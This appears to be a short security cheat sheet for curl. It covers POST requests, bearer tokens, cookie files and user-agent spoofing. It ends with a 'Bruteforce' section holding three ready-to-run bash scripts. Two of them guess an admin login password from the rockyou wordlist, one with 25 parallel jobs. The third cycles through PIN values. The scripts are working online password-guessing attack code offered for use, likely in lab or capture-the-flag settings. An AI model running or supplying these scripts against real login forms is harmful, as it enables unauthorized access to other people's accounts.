## POST request

````shell
curl -i -X POST -d 'username=admin&password=admin' 'http://...'
````


## Bearer token

````shell
curl -i -H 'Authorization: Bearer {token}' 'http://...'
````


## Cookies

`-c file` to save cookies:

````shell
curl -i -c cookies.txt -X POST -d 'username=admin&password=admin' 'http://...'
````

`-b file` to use the saved cookies:

````shell
curl -i -b cookies.txt -'http://...'
````


## User-agent forgery

````shell
curl -i -A 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' 'http://...'
````


## Bruteforce

[install wordlist](https://github.com/TurboLabIt/cybersec/blob/main/script/wordlist/install.sh).

Then:

````shell
clear && nano attack.sh && bash attack.sh
````

Script to try passwords (parallel exec):

````shell
#!/usr/bin/env bash

if [ -z $(command -v parallel) ]; then sudo apt update && sudo apt install parallel -y; fi

function do_check()
{
  echo -n "."
  pass="$1"

  response=$(curl -s -A 'secretcomputer' -X POST -d "username=admin&password=$pass" 'http://...')

  if ! echo "$response" | grep -iq "invalid credentials"; then

    echo ""
    echo "$response"
    echo -e "\n---------\n"
    echo "[+] Password found: $pass"

    # Kill the parent parallel process to stop all other attempts
    killall parallel 2>/dev/null
    exit 0
  fi

  exit 1
}

export -f do_check

parallel --jobs 25 --halt now,success=1 do_check :::: /usr/share/wordlists/rockyou.txt
````


Script to try passwords (single-process):

````shell
#!/usr/bin/env bash

while IFS= read -r pass; do

  echo -n '.'
  response=$(curl -s -A 'secretcomputer' -X POST -d "username=admin&password=$pass" 'http://...')
  #echo "$response"

  if ! echo "$response" | grep -iq "invalid credentials"; then

    echo ""
    echo "$response"
    echo -e "\n---------\n"
    echo "[+] Password found: $pass"
    break

  fi

done < /usr/share/wordlists/rockyou.txt
````


Script to try numbers:

````shell
#!/bin/bash

for pin in {0..10}; do

  echo -n '.'
  response=$(curl -s -A 'secretcomputer' -X POST -d "pin=$pin" 'http://...')
  #echo "$response"

  if ! echo "$response" | grep -iq "Incorrect PIN"; then

    echo ""
    echo "$response"
    echo -e "\n---------\n"
    echo "[+] PIN found: $pin"
    break

  fi

done
````
